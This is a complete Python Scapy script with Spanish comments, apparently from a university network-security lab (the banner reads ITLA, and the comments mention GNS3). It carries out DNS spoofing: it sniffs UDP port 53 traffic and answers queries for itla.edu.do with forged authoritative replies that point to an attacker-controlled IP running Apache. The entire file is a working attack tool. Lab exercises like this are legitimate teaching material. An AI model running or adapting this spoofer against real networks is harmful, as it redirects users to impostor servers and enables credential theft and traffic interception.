from scapy.all import (
    IP, UDP, DNS, DNSQR, DNSRR,
    sniff, send, conf, get_if_addr
)
import sys
import signal

# ─── Configuración ───────────────────────────────────────────────────────────
IFACE         = "eth0"               # Interfaz del atacante en GNS3
ATTACKER_IP   = "10.11.85.10"     # IP del atacante (donde corre Apache)
TARGET_DOMAIN = b"itla.edu.do."   # Dominio a spoofear (con punto final)
# ─────────────────────────────────────────────────────────────────────────────

def handle_packet(pkt):
    """Intercepta consultas DNS y responde con la IP del atacante."""
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
        return  # Solo consultas (qr=0)

    qname = pkt[DNS].qd.qname

    # Verificar si la consulta es por el dominio objetivo
    if TARGET_DOMAIN not in qname and b"itla.edu.do" not in qname:
        return

    print(f"[+] Consulta DNS capturada: {qname.decode()} desde {pkt[IP].src}")

    # Construir respuesta DNS falsa
    spoofed = (
        IP(dst=pkt[IP].src, src=pkt[IP].dst) /
        UDP(dport=pkt[UDP].sport, sport=53) /
        DNS(
            id=pkt[DNS].id,
            qr=1,          # Respuesta
            aa=1,          # Autoritativa
            rd=0,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=qname,
                type="A",
                ttl=300,
                rdata=ATTACKER_IP
            )
        )
    )

    send(spoofed, iface=IFACE, verbose=False)
    print(f"[+] Respuesta falsa enviada: {qname.decode()} → {ATTACKER_IP}")


def signal_handler(sig, frame):
    print("\n[!] Ataque detenido por el usuario.")
    sys.exit(0)


def main():
    signal.signal(signal.SIGINT, signal_handler)

    # Verificar que Scapy pueda usar la interfaz
    conf.iface = IFACE

    print("=" * 60)
    print("  DNS Spoofing - itla.edu.do")
    print("  Seguridad de Redes | ITLA | 2024-1185")
    print("=" * 60)
    print(f"  Interfaz  : {IFACE}")
    print(f"  Redirigir : itla.edu.do → {ATTACKER_IP}")
    print(f"  Apache    : asegúrate de que esté activo (service apache2 start)")
    print("=" * 60)
    print("[*] Escuchando consultas DNS en el segmento 10.11.85.0/24...")
    print("    Presiona Ctrl+C para detener.\n")

    # Filtro BPF: solo tráfico UDP puerto 53 (DNS)
    sniff(
        iface=IFACE,
        filter="udp port 53",
        prn=handle_packet,
        store=False
    )


if __name__ == "__main__":
    main()
